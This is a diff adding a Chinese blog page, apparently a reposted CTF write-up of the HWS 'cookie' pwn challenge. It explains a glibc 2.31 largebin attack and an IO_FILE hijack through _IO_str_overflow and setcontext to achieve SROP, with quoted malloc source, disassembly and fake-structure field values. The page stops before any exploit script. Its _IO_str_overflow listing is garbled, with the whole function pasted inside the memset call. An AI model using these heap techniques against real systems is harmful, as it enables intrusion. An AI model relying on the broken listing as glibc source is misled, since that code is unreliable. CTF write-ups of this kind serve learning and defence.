@@ -1,0 +1,1361 @@
+
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Vinadiak's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="HWS非常难的一道题，通过这个可以学习IO_FILE_LIST的使用和large bin attack">
+<meta name="keywords" content="IOT security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HWS_cookie">
+<meta property="og:url" content="http://localhost:4000/ctf/pwn/2020/10/04/HWS_cookie/">
+<meta property="og:site_name" content="Vinadiak's Blog">
+<meta property="og:description" content="HWS非常难的一道题，通过这个可以学习IO_FILE_LIST的使用和large bin attack">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t017a32afa21fdf6fb5.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t010103630cc92153e2.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t019a05f4eec2600874.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t019bbb73d2089b8dab.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01359312968708ac80.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t0195570e6d822ae8e8.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01114db3b46acbee25.png">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HWS_cookie">
+<meta name="twitter:description" content="HWS非常难的一道题，通过这个可以学习IO_FILE_LIST的使用和large bin attack">
+<meta name="twitter:image" content="https://p3.ssl.qhimg.com/t017a32afa21fdf6fb5.png">
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://localhost:4000/"/>
+
+
+
+
+
+  <title>HWS_cookie | Vinadiak's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Vinadiak's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">IOT security lover</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+<div id="posts" class="posts-expand">
+  
+  
+
+  
+
+  
+  
+  
+
+  <article class="post post-type- " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/ctf/pwn/2020/10/04/HWS_cookie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Vinadiak">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/upload/MyAvatar.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Vinadiak's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+          
+          
+            HWS_cookie
+          
+        </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-04T00:00:00+08:00">
+                2020-10-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/#/CTF%2FPWN" itemprop="url" rel="index">
+                    <span itemprop="name">CTF/PWN</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+            
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <!-- more -->
+
+<h1 id="前言">前言</h1>
+
+<p>参加完HWS之后一直对这道题怎么解很感兴趣，由于这道题用了2.31的新版本libc,自己对新版本libc的利用还未完全掌握，通过这道题让我对libc2.31有了更深的了解，本文是转载的，exp代码有做修改方便阅读和了解，原版的请查看下面文章</p>
+
+<p>来源：安全客</p>
+
+<p>作者：cnitlrt</p>
+
+<p>原文链接:<a href="https://www.anquanke.com/post/id/216290">https://www.anquanke.com/post/id/216290</a></p>
+
+<h1 id="largebin-attack">largebin attack</h1>
+
+<p>largebin attack在2.30之后添加了一些检查，不能使用之前先插入小large bin，再插入大largebin实现attack，而是先插入大的再插入小的，查看源码：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37<br/>38<br/>39<br/>40<br/>41<br/>42<br/>43<br/>44<br/>45<br/>46<br/>47<br/>48<br/>49<br/>50<br/>51<br/>52<br/>53<br/>54<br/>55<br/>56<br/>57<br/>58<br/>59</pre></td><td class="code"><pre class="highlight"><code><span class="k">else</span>
+<span class="p">{</span>
+  <span class="n">victim_index</span> <span class="o">=</span> <span class="n">largebin_index</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
+  <span class="n">bck</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+  <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+
+  <span class="o">/*</span> <span class="n">maintain</span> <span class="n">large</span> <span class="n">bins</span> <span class="ow">in</span> <span class="nb">sorted</span> <span class="n">order</span> <span class="o">*/</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fwd</span> <span class="o">!=</span> <span class="n">bck</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="o">/*</span> <span class="n">Or</span> <span class="k">with</span> <span class="n">inuse</span> <span class="n">bit</span> <span class="n">to</span> <span class="n">speed</span> <span class="n">comparisons</span> <span class="o">*/</span>
+      <span class="n">size</span> <span class="o">|=</span> <span class="n">PREV_INUSE</span><span class="p">;</span>
+      <span class="o">/*</span> <span class="k">if</span> <span class="n">smaller</span> <span class="n">than</span> <span class="n">smallest</span><span class="p">,</span> <span class="n">bypass</span> <span class="n">loop</span> <span class="n">below</span> <span class="o">*/</span>
+      <span class="k">assert</span> <span class="p">(</span><span class="n">chunk_main_arena</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">));</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">unsigned</span> <span class="nb">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span>
+  <span class="o">&lt;</span> <span class="p">(</span><span class="n">unsigned</span> <span class="nb">long</span><span class="p">)</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">))</span>
+        <span class="p">{</span>
+          <span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+          <span class="n">bck</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+
+          <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+          <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+          <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="k">else</span>
+        <span class="p">{</span>
+          <span class="k">assert</span> <span class="p">(</span><span class="n">chunk_main_arena</span> <span class="p">(</span><span class="n">fwd</span><span class="p">));</span>
+          <span class="k">while</span> <span class="p">((</span><span class="n">unsigned</span> <span class="nb">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">))</span>
+            <span class="p">{</span>
+              <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
+  <span class="k">assert</span> <span class="p">(</span><span class="n">chunk_main_arena</span> <span class="p">(</span><span class="n">fwd</span><span class="p">));</span>
+            <span class="p">}</span>
+
+          <span class="k">if</span> <span class="p">((</span><span class="n">unsigned</span> <span class="nb">long</span><span class="p">)</span> <span class="n">size</span>
+  <span class="o">==</span> <span class="p">(</span><span class="n">unsigned</span> <span class="nb">long</span><span class="p">)</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">))</span>
+            <span class="o">/*</span> <span class="n">Always</span> <span class="n">insert</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">second</span> <span class="n">position</span><span class="o">.</span>  <span class="o">*/</span>
+            <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+          <span class="k">else</span>
+            <span class="p">{</span>
+              <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
+              <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">))</span>
+                <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): largebin double linked list corrupted (nextsize)"</span><span class="p">);</span>
+              <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+              <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+            <span class="p">}</span>
+          <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">)</span>
+            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): largebin double linked list corrupted (bk)"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="k">else</span>
+    <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">mark_bin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim_index</span><span class="p">);</span>
+<span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+<span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
+<span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+<span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>看到红色部分，检查了前面的fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd 以及 bck-&gt;fd != fwd，所以常用的方法已经不奏效了。但是我们这里仅检查了unsortedbin size &gt; largbin size，却没有检查large bin &lt; unsorted bin，所以我们可以在largbin中添加一个堆块，同时释放一个比它小并且在同一index的堆块进unsortedbin,改变largbin的bk_nextsize为targetaddr-0x20,然后我们申请一个free之后可以放入unsortedbin的堆块,这时会将unsortedbin放入largbin，然后就会执行</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1</pre></td><td class="code"><pre class="highlight"><code><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>此时 victim-&gt;bk_nextsize = target_addr-0x20,target_addr-0x20-&gt;fd_nextsize = target_addr = victim，即可将堆地址放入到我们想要的地方。</p>
+
+<h2 id="io_file攻击原理">IO_FIle攻击原理：</h2>
+
+<p>在以前版本的IO_FILE攻击普遍上采用的是劫持IO函数的_chain字段为伪造的IO_FILE_plus然后进行利用，其中伪造的IO_FILE_plus的vtable一般是io_str_overflow这种函数，而新版本的IO_FILE攻击也不例外，首先我们看一下libc2.32上的io_str_overflow函数</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32<br/>33<br/>34<br/>35<br/>36<br/>37<br/>38<br/>39<br/>40<br/>41<br/>42<br/>43<br/>44<br/>45<br/>46<br/>47<br/>48<br/>49<br/>50<br/>51<br/>52<br/>53<br/>54<br/>55<br/>56<br/>57<br/>58</pre></td><td class="code"><pre class="highlight"><code>int
+_IO_str_overflow (FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  size_t pos;
+  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    {
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+    }
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+      else
+    {
+      char *new_buf;
+      char *old_buf = fp-&gt;_IO_buf_base;
+      size_t old_blen = _IO_blen (fp);
+      size_t new_size = 2 * old_blen + 100;
+      if (new_size &lt; old_blen)
+        return EOF;
+      new_buf = malloc (new_size);
+      if (new_buf == NULL)
+        {
+          /*      __ferror(fp) = 1; */
+          return EOF;
+        }
+      if (old_buf)
+        {
+          memcpy (new_buf, old_buf, old_blen);
+          free (old_buf);
+          /* Make sure _IO_setb won't try to delete _IO_buf_base. */
+          fp-&gt;_IO_buf_base = NULL;
+        }
+      memset (new_buf + old_blen, '<pre class="highlight"><code>int
+_IO_str_overflow (FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  size_t pos;
+  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+    {
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+    }
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
+  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))
+    {
+      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
+    return EOF;
+      else
+    {
+      char *new_buf;
+      char *old_buf = fp-&gt;_IO_buf_base;
+      size_t old_blen = _IO_blen (fp);
+      size_t new_size = 2 * old_blen + 100;
+      if (new_size &lt; old_blen)
+        return EOF;
+      new_buf = malloc (new_size);
+      if (new_buf == NULL)
+        {
+          /*      __ferror(fp) = 1; */
+          return EOF;
+        }
+      if (old_buf)
+        {
+          memcpy (new_buf, old_buf, old_blen);
+          free (old_buf);
+          /* Make sure _IO_setb won't try to delete _IO_buf_base. */
+          fp-&gt;_IO_buf_base = NULL;
+        }
+      memset (new_buf + old_blen, '\0', new_size - old_blen);
+
+      _IO_setb (fp, new_buf, new_buf + new_size, 1);
+      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
+      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
+      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
+      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);
+
+      fp-&gt;_IO_write_base = new_buf;
+      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
+    }
+    }
+
+  if (!flush_only)
+    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;
+  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
+  return c;
+}
+</code></pre>', new_size - old_blen);
+
+      _IO_setb (fp, new_buf, new_buf + new_size, 1);
+      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
+      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
+      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
+      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);
+
+      fp-&gt;_IO_write_base = new_buf;
+      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
+    }
+    }
+
+  if (!flush_only)
+    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;
+  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
+    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
+  return c;
+}
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>可以看到程序里面有malloc,memcpy,free等函数，并且参数我们都可以控制因此可以利用这一点来进行非预期的堆块申请释放和填充,而且我们看一下IO_str_overflow的汇编代码可以看到一个有意思的位置：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5<br/>6<br/>7<br/>8<br/>9<br/>10<br/>11<br/>12<br/>13<br/>14<br/>15<br/>16<br/>17<br/>18<br/>19<br/>20<br/>21<br/>22<br/>23<br/>24<br/>25<br/>26<br/>27<br/>28<br/>29<br/>30<br/>31<br/>32</pre></td><td class="code"><pre class="highlight"><code>   0x7ffff7e6eb20 &lt;__GI__IO_str_overflow&gt;:    repz nop edx
+   0x7ffff7e6eb24 &lt;__GI__IO_str_overflow+4&gt;:    push   r15
+   0x7ffff7e6eb26 &lt;__GI__IO_str_overflow+6&gt;:    push   r14
+   0x7ffff7e6eb28 &lt;__GI__IO_str_overflow+8&gt;:    push   r13
+   0x7ffff7e6eb2a &lt;__GI__IO_str_overflow+10&gt;:    push   r12
+   0x7ffff7e6eb2c &lt;__GI__IO_str_overflow+12&gt;:    push   rbp
+   0x7ffff7e6eb2d &lt;__GI__IO_str_overflow+13&gt;:    mov    ebp,esi
+   0x7ffff7e6eb2f &lt;__GI__IO_str_overflow+15&gt;:    push   rbx
+   0x7ffff7e6eb30 &lt;__GI__IO_str_overflow+16&gt;:    sub    rsp,0x28
+   0x7ffff7e6eb34 &lt;__GI__IO_str_overflow+20&gt;:    mov    eax,DWORD PTR [rdi]
+   0x7ffff7e6eb36 &lt;__GI__IO_str_overflow+22&gt;:    test   al,0x8
+   0x7ffff7e6eb38 &lt;__GI__IO_str_overflow+24&gt;:    jne    0x7ffff7e6eca0 &lt;__GI__IO_str_overflow+384&gt;
+   0x7ffff7e6eb3e &lt;__GI__IO_str_overflow+30&gt;:    mov    edx,eax
+   0x7ffff7e6eb40 &lt;__GI__IO_str_overflow+32&gt;:    mov    rbx,rdi
+   0x7ffff7e6eb43 &lt;__GI__IO_str_overflow+35&gt;:    and    edx,0xc00
+   0x7ffff7e6eb49 &lt;__GI__IO_str_overflow+41&gt;:    cmp    edx,0x400
+   0x7ffff7e6eb4f &lt;__GI__IO_str_overflow+47&gt;:    je     0x7ffff7e6ec80 &lt;__GI__IO_str_overflow+352&gt;
+   0x7ffff7e6eb55 &lt;__GI__IO_str_overflow+53&gt;:    mov    rdx,QWORD PTR [rdi+0x28]  &lt;----
+   0x7ffff7e6eb59 &lt;__GI__IO_str_overflow+57&gt;:    mov    r14,QWORD PTR [rbx+0x38]
+   0x7ffff7e6eb5d &lt;__GI__IO_str_overflow+61&gt;:    mov    r12,QWORD PTR [rbx+0x40]
+   0x7ffff7e6eb61 &lt;__GI__IO_str_overflow+65&gt;:    xor    ecx,ecx
+   0x7ffff7e6eb63 &lt;__GI__IO_str_overflow+67&gt;:    mov    rsi,rdx
+   0x7ffff7e6eb66 &lt;__GI__IO_str_overflow+70&gt;:    sub    r12,r14
+   0x7ffff7e6eb69 &lt;__GI__IO_str_overflow+73&gt;:    cmp    ebp,0xffffffff
+   0x7ffff7e6eb6c &lt;__GI__IO_str_overflow+76&gt;:    sete   cl
+   0x7ffff7e6eb6f &lt;__GI__IO_str_overflow+79&gt;:    sub    rsi,QWORD PTR [rbx+0x20]
+   0x7ffff7e6eb73 &lt;__GI__IO_str_overflow+83&gt;:    add    rcx,r12
+   0x7ffff7e6eb76 &lt;__GI__IO_str_overflow+86&gt;:    cmp    rcx,rsi
+   0x7ffff7e6eb79 &lt;__GI__IO_str_overflow+89&gt;:    ja     0x7ffff7e6ec4a &lt;__GI__IO_str_overflow+298&gt;
+   0x7ffff7e6eb7f &lt;__GI__IO_str_overflow+95&gt;:    test   al,0x1
+   0x7ffff7e6eb81 &lt;__GI__IO_str_overflow+97&gt;:    jne    0x7ffff7e6ecc0 &lt;__GI__IO_str_overflow+416&gt;
+   0x7ffff7e6eb87 &lt;__GI__IO_str_overflow+103&gt;:    lea    r15,[r12+r12*1+0x64]
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>可以看到在调用malloc之前的<strong>0x7ffff7e6eb55</strong>位置<strong>rdx</strong>被赋值为<strong>[rdi+0x28]</strong>,而此时的rdi恰好指向我们伪造的IO_FILE_plus的头部，而在glibc2.29的版本上setcontext的利用从以前的rdi变为了rdx，因此我们可以通过这个位置来进行新版下的setcontext,进而实现<strong>srop</strong>,具体做法是利用非预期地址填充将malloc_hook填充为setcontext，这样在我们进入io_str_overflow时首先会将rdx赋值为我们可以控制的地址，然后在后面malloc的时候会触发setcontext，而此时rdx已经可控，因此就可以成功实现srop
+综上可知参数对应关系为：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3<br/>4<br/>5</pre></td><td class="code"><pre class="highlight"><code>_flags = 0
+_IO_write_ptr = 用于srop的地址（此时同时满足了fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base）
+new_buf = malloc(2 * (_IO_buf_end - _IO_buf_base ) + 100)
+memcpy(new_buf，_IO_buf_base，_IO_buf_end - _IO_buf_base)
+free(_IO_buf_base)
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="攻击流程">攻击流程</h2>
+
+<p>此种方法一般结合largebin attrack,因为largebin attrack可以实现任意地址填充堆地址，因此我们可以利用largebin attrack将io函数的_chain字段劫持为堆地址，然后当程序退出的时候会刷新程序流此时会进入我们伪造的io_file中实现我们的攻击,下面我们用我出的一个例题来具体体会一下该方法的威力</p>
+
+<h2 id="练习">练习</h2>
+
+<p>此题为HWS – cookie</p>
+
+<h3 id="分析">分析：</h3>
+
+<p>该题为glibc2.31,程序有add del edit show功能，在del里面有着明显的uaf漏洞，并且开了沙盒，add的时候只能申请largebin范围的堆块并且不超过0x600</p>
+
+<h3 id="利用">利用：</h3>
+
+<p>我们考虑使用largebin attrack劫持stderr-&gt;_chain字段为一个堆地址并且劫持global_max_fast为堆地址用来构造chunkoverlapping,通过chunkoverlapping在0xa0的bin中留下两个堆块，其中一个是malloc_hook,然后我们利用io_file的非预期堆块申请申请到malloc_hook同时用非预期填充将malloc_hook填充为setcontext,这样在进入下一个fake IO_FILE的时候就会触发srop进而orw出flag,由此我们需要构造三个fake IO_FILE_plus，前两个用来申请到malloc_hook并且将malloc_hook填充为setcontext,最后一个用来设置rdx的值同时触发srop,</p>
+
+<h3 id="调试">调试</h3>
+
